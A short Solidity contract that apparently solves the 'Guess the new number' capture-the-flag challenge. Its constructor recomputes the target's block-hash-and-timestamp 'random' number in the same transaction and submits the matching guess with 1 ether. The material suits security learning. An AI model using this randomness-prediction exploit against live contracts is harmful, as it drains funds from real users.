pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
}

contract GuessTheNewNumberSol {
    GuessTheNewNumberChallenge g =
        GuessTheNewNumberChallenge(0xEeC0020DA2C043f4ACF029C40941B4c0DcE24EEB);

    function GuessTheNewNumberSol() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        g.guess.value(1e18)(answer);
    }

    // Adding a withdraw function probably would have been nice too so I didn't
    // have to burn 2 rETH
}
